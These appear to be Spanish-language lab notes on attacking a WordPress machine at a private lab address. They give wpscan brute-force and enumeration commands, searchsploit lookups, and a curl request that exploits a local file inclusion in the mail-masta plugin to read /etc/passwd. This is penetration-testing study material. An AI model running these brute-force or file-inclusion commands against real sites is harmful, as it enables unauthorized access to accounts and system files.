## Fuerza bruta utilizando wpscan
```
wpscan -U admin -P /usr/share/wordlist/rockyou.txt --url http://10.0.2.8/wp-login.php
```

## Explotación de plugins
```
wpscan --url http://10.0.2.8/
```
![[Pasted image 20250701213227.png]]
Vamos a buscar exploits asociados con los plugins
```
searchsploit wordpress site editor
searchsploit wordpress mail masta
```
![[Pasted image 20250701213524.png]]
Examinaremos el exploit de texto del plugin mail masta:
```
searchsploit -x 40290
```
![[Pasted image 20250701214141.png]]
El LFI lo aconteceremos de la siguiente forma:
```
curl -s -X GET "http://10.0.2.8/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```
Podemos explotar el LFI de una forma similar con el plugin site editor

